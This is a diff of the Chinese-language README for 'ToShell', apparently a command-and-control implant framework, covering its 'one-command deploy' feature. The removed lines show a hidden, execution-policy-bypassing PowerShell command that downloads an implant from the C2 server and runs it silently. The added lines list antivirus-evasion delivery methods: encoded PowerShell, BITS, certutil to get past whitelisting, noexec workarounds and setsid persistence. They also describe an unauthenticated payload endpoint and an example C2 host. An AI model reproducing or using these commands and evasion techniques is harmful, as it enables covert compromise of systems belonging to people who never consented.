@@ -149,18 +149,34 @@ ToShell 由三部分组成:
 4. 点击「生成」,等待构建完成(首次构建需拉取依赖/工具链,耗时较长);
 5. 在列表中点击「下载」获取载荷。**已生成的载荷再次下载会直接从磁盘返回,不会重新编译**,速度极快。
 
-### 5.1 一条命令上线(对应不同监听)
+### 5.1 一条命令上线(多种免杀方式)
 
-生成 **exe / raw**(Windows amd64)载荷后,页面会给出**一条命令上线**命令,
-直接复制到目标主机(CMD 或 PowerShell 均可)执行,即可静默下载并运行该载荷,无需手动传文件:
+生成**可直接运行**的载荷后(Windows:`exe` / `raw`;Linux:`exe` / `raw` / `bin`),
+页面会列出**多条一键上线命令**,任选一条复制到目标主机执行,即可静默下载并运行该载荷,
+无需手动传文件。落地文件名每次随机,避免固定文件名被静态特征命中:
 
-```powershell
-powershell -w hidden -nop -ep bypass -c "Invoke-WebRequest -UseBasicParsing 'http://<后台地址>:18081/api/v1/implant/payload/<载荷ID>' -OutFile $env:TEMP\svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\svc.exe"
-```
+| 平台 | 方式 | 说明 |
+| --- | --- | --- |
+| Windows | PowerShell · Base64 编码 | `-enc` 编码后命令行不暴露下载地址与落地路径,WebClient 静默下载 + 隐藏窗口启动(首选) |
+| Windows | PowerShell · BITS 传输 | 由 BITS 服务(svchost)出网下载,可绕只放行系统更新出网的主机策略 |
+| Windows | PowerShell · HttpClient | 去掉 `WebClient` + `DownloadFile` 组合明文特征 |
+| Windows | CMD · certutil | 系统自带签名工具下载,白名单/应用控制策略常放过 |
+| Windows | CMD · bitsadmin | BITS 命令行工具,兼容老系统 |
+| Windows | CMD · curl.exe | Win10 1803+ / Server 2019+ 自带,不触发 PowerShell 执行策略 |
+| Linux | Shell · curl / wget 兜底 | curl 失败自动回退 wget(首选) |
+| Linux | Shell · wget | 仅依赖 wget(部分加固镜像卸载了 curl) |
+| Linux | Shell · busybox wget | 路由 / IoT / 精简容器镜像 |
+| Linux | Shell · python3 | 没有 curl/wget 但装了 python3 的镜像 |
+| Linux | Shell · 落地用户目录 | 规避 `/tmp` 被挂载为 `noexec` 的加固基线 |
+| Linux | Shell · setsid 脱离终端 | 独立会话,ssh 执行后立即断开也不会被回收 |
 
-- 该下载端点 `/api/v1/implant/payload/{id}` **免认证**,URL 内已绑定载荷 ID,只有拿到该载荷 ID 的人才可下载;
-- 不同监听器对应不同载荷:生成时选择哪个监听器,命令就指向对应回连地址,命令中的下载地址取当前后台访问地址;
-- 载荷列表每项也有「一条命令上线」按钮,可随时复制对应命令。
+- 下载端点 `/api/v1/implant/payload/{id}` **免认证**,URL 内已绑定载荷 ID,只有拿到该载荷 ID 的人才可下载;
+- 命令里的下载地址**由服务端解析**为目标机可达的地址(不再取控制台自身的 `localhost`),优先级:
+  `listener.public_host`(推荐:公网 IP 或 CDN/反代域名) → 控制台访问地址(反代域名自动识别) →
+  载荷 `server_url` 的主机名 + API 端口 → 本机内网 IP;全部落空时页面会显示醒目告警,提示去配置 `public_host`;
+- 需要临时指定地址(例如同一次构建供不同网段使用),可在生成请求里带 `download_host`
+  (如 `{"download_host":"https://c2.example.com"}`,填完整 URL 会原样使用,可含反代子路径);
+- 载荷列表每项的「一条命令上线」按钮会**实时**向服务端重新生成命令,改了对外地址无需重新构建载荷。
 
 ### 6. 命令行方式(可选)
 
